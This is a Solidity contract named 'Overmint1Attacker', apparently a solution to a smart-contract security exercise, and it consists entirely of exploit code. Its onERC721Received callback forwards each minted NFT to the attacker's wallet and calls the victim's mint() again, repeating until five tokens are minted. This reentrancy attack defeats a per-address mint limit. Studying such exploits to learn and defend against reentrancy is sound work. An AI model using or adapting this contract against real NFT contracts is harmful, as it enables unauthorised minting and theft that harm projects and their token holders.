//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

contract Overmint1Attacker is IERC721Receiver {
    address public victimAddress;
    address public attackerWallet;
    //bool public isAttacking = true;
    uint256 public mintCounter = 1;

    event Attack(string message, bool success);
    event Received(address operator, address from, uint256 tokenId, bytes data);

    constructor(address _victimAddress) {
        victimAddress = _victimAddress;
        attackerWallet = msg.sender;
    }

    // function setIsAttacking(bool qAttack) internal {
    //     isAttacking = qAttack;
    // }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        console.log("from :", from);
        console.log("tokenId: ", tokenId);
        console.log("attackerWallet:", attackerWallet);
        transferNFT(victimAddress, address(this), attackerWallet, tokenId);
        //victimAddress.call(abi.encodeWithSelector(bytes4(keccak256(bytes("transferFrom(address,address,uint256)")))))
        if (mintCounter != 5) {
            //setIsAttacking(false);
            mintCounter++;
            (bool success,) = victimAddress.call(abi.encodeWithSelector(bytes4(keccak256(bytes("mint()")))));
            emit Attack("onERC721ReceivedCalled", success);
        }
        emit Received(operator, from, tokenId, data);
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() public {
        (bool success,) = victimAddress.call(abi.encodeWithSelector(bytes4(keccak256(bytes("mint()")))));
        console.log("success from contract :", success);
        emit Attack("Attack", success);
        //setIsAttacking(true);
    }

    function transferNFT(address nftContract, address from, address to, uint256 tokenId) public returns (bool) {
        bytes4 selector = bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));

        (bool success, bytes memory data) = nftContract.call(abi.encodeWithSelector(selector, from, to, tokenId));

        if (!success) {
            // Optional: Decode the revert reason
            if (data.length > 0) {
                // Decoding the revert reason if provided by the contract that reverted
                string memory revertReason = abi.decode(data, (string));
                revert(revertReason);
            } else {
                revert("NFT transfer failed without a revert reason");
            }
        }

        return success;
    }
}
